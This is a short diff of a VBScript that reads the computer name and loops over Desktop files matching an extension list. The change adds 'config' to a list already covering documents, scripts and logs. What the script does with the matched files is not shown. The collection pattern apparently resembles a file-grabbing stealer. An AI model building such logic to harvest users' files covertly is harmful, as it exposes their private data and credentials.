@@ -13,7 +13,7 @@ computerName = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
 folderPath = shell.SpecialFolders("Desktop")
 Set folder = fso.GetFolder(folderPath)
 
-extensions = "mxl,pdf,txt,docx,ps1,vbs,info,log" 
+extensions = "mxl,pdf,txt,docx,ps1,vbs,info,log,config" 
 
 For Each file In folder.Files
     If IsTargetExtension(file.Name, extensions) Then
